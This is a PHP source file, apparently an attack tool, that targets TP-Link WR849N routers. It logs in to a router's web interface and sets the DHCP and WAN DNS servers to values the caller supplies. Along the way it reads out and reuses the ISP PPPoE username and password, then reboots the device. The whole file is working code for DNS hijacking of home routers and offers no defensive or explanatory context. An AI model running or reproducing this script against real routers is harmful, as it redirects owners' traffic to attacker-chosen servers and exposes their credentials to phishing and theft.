<?php



class WR849N
{

    private $ch;
    private $Host;
    public $User;
    public $Pass;
    public $Auth;
    public $Exploited;

    function GetStr($string, $start, $end)
    {
        $string = ' ' . $string;
        $ini = strpos($string, $start);
        if ($ini == 0) return '';
        $ini += strlen($start);
        $len = strpos($string, $end, $ini) - $ini;
        return substr($string, $ini, $len);
    }



    function __construct()
    {
        $this->ch 		= curl_init();
        $this->Auth		= false;
    }

    public function Login($Host,$User,$Pass)
    {
        @unlink("cookie.txt");
        if ($this->Exploited == true) {
            $User = $this->User;
            $Pass = $this->Pass;
        }
        @unlink("cookie.txt");
       $ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");

		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

		$headers = array();
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/";
		$headers[] = "Cookie: Authorization=Basic ".base64_encode($User.":".$Pass);
		$headers[] = "Connection: keep-alive";
		$headers[] = "Cache-Control: max-age=0";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);echo $result;
        $Status = (strpos($result,"../img/login/username.png") == false) ? true : false;

        if ($Status)
        {
            //
            $this->Host = $Host;
            $this->User = $User;
            $this->Pass = $Pass;
            $this->Auth = $Status;
        }
        return $Status;
    }






    public function ChangeDNS($Host,$User,$Pass,$DNS1,$DNS2)
    {
        $Resultado = false;
        if ($this->Auth)
        {
			$ch = curl_init();
		
          	$PostData = "[LAN_HOST_CFG#1,0,0,0,0,0#0,0,0,0,0,0]0,9
DHCPServerEnable=1
minAddress=192.168.0.100
maxAddress=192.168.0.199
IPRouters=192.168.0.1
DHCPLeaseTime=7200
domainName=
DNSServers={$DNS1},{$DNS2}
DHCPRelay=0
X_TP_DhcpRelayServer=0.0.0.0
";
            curl_setopt($ch, CURLOPT_URL, "http://{$Host}/cgi?2");
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $PostData);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

			$headers = array();
			$headers[] = "Origin: http://{$Host}";
			$headers[] = "Accept-Encoding: gzip, deflate";
			$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
			$headers[] = "Content-Type: text/plain";
			$headers[] = "Accept: */*";
			$headers[] = "Referer: http://{$Host}/mainFrame.htm";
			$headers[] = "Cookie: Authorization=Basic ".base64_encode($User.":".$Pass);
			$headers[] = "Connection: keep-alive";
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			$result = curl_exec($ch);
			$Resultado =  ( strpos($result ,"[error]0") !== false) ? true : false;	
			$PostData = "[WAN_PPP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]0,0
[WAN_IP_CONN#1,1,2,0,0,0#0,0,0,0,0,0]1,0
";
            curl_setopt($ch, CURLOPT_URL, "http://{$Host}/cgi?1&1");
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $PostData);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

			$headers = array();
			$headers[] = "Origin: http://{$Host}";
			$headers[] = "Accept-Encoding: gzip, deflate";
			$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
			$headers[] = "Content-Type: text/plain";
			$headers[] = "Accept: */*";
			$headers[] = "Referer: http://{$Host}/mainFrame.htm";
			$headers[] = "Cookie: Authorization=Basic ".base64_encode($User.":".$Pass);
			$headers[] = "Connection: keep-alive";
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			$result = curl_exec($ch);//echo $result;
			$User = "";
			$Pass = "";
			$externalIPAddress = "";
			$X_TP_lastUsedIntf = "";
			foreach ( explode("\n",$result) as $Line ) {
				
				if ( strpos($Line,"username") !== false ) {
						$User = $this->GetStr($Line."|","username=","|");
						
				}
				if ( strpos($Line,"password=") !== false ) {
						$Pass = $this->GetStr($Line."|","password=","|");
					
				}
				if ( strpos($Line,"externalIPAddress") !== false ) {
						$externalIPAddress = $this->GetStr($Line."|","externalIPAddress=","|");
					
				}
				
				
			}
			$PostData = "[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,1
X_TP_lastUsedIntf=pppoe_eth3_d
[WAN_PPP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,17
username={$User}
password={$Pass}
connectionTrigger=AlwaysOn
PPPAuthenticationProtocol=AUTO_AUTH
PPPoEACName=
PPPoEServiceName=
maxMRUSize=1480
NATEnabled=1
X_TP_FullconeNATEnabled=0
X_TP_FirewallEnabled=1
X_TP_UseStaticIP=0
PPPLCPEcho=0
DNSOverrideAllowed=1
DNSServers={$DNS1},{$DNS2}
X_TP_IPv4Enabled=1
secondConnection=sec_conn_staip
enable=1
[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]2,10
externalIPAddress=169.254.1.1
subnetMask=255.255.255.255
defaultGateway=0.0.0.0
DNSOverrideAllowed=1
DNSServers={$DNS1},{$DNS2}
NATEnabled=1
X_TP_FullconeNATEnabled=0
X_TP_FirewallEnabled=1
maxMTUSize=1500
enable=1
";
			

            curl_setopt($ch, CURLOPT_URL, "http://{$Host}/cgi?2&2&2");
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $PostData);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

			$headers = array();
			$headers[] = "Origin: http://{$Host}";
			$headers[] = "Accept-Encoding: gzip, deflate";
			$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
			$headers[] = "Content-Type: text/plain";
			$headers[] = "Accept: */*";
			$headers[] = "Referer: http://{$Host}/mainFrame.htm";
			$headers[] = "Cookie: Authorization=Basic ".base64_encode($User.":".$Pass);
			$headers[] = "Connection: keep-alive";
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			$result = curl_exec($ch);//echo $result;
			
			$Resultado =  ( strpos($result ,"[error]0") !== false) ? true : false;
			

        }
        return $Resultado;
	}
    public function DoOthers($Host,$User,$Pass)
    {

        if ($this->Auth)
        {
            $PostData = "[ACT_REBOOT#0,0,0,0,0,0#0,0,0,0,0,0]0,0
";
			$ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://{$Host}/cgi?7");
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $PostData);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

			$headers = array();
			$headers[] = "Origin: http://{$Host}";
			$headers[] = "Accept-Encoding: gzip, deflate";
			$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
			$headers[] = "Content-Type: text/plain";
			$headers[] = "Accept: */*";
			$headers[] = "Referer: http://{$Host}/mainFrame.htm";
			$headers[] = "Cookie: Authorization=Basic ".base64_encode($User.":".$Pass);
			$headers[] = "Connection: keep-alive";
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			$result = curl_exec($ch);
			echo $result;
        }
        @unlink("cookies.txt");
    }









}


